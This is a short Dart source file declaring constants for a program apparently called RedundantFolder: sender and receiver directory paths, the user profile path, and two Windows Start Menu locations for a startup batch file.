import 'dart:io';

const debug = false;
final inv = Directory('./bin/inviatore').absolute.path;
final ric = Directory('./bin/ricevitore').absolute.path;

const String prgmName = "RedundantFolder.exe";
const String baseStartupPath =
    "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\"
    "Programs\\Startup\\RedundantFolder.bat";
const String secondStartupPath =
    "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\"
    "Programs\\system\\RedundantFolder.bat";
String user = Platform.environment["userprofile"]!;
